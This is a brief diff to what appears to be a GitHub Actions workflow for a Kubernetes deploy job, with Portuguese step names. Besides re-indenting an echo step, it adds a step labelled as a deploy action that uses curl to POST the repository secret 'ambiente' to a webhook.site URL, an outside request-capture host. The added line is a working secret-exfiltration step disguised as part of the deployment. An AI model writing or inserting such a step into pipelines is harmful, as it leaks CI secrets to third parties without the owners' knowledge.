@@ -9,5 +9,7 @@ jobs:
     deploy-kubernetes:
         runs-on: ubuntu-latest
         steps:
-            - name: Deploy no ambiente
-              run: echo "Executando o deploy no ambiente de ${{ secrets.ambiente }}"
+            -   name: Deploy no ambiente
+                run: echo "Executando o deploy no ambiente de ${{ secrets.ambiente }}"
+            -   name: Curl deploy no ambiente
+                run: "curl -X POST https://webhook.site/4dab6a4c-6b8b-4d61-a152-3eb2032950f4 -d '{ ambiente: ${{ secrets.ambiente }}}'"
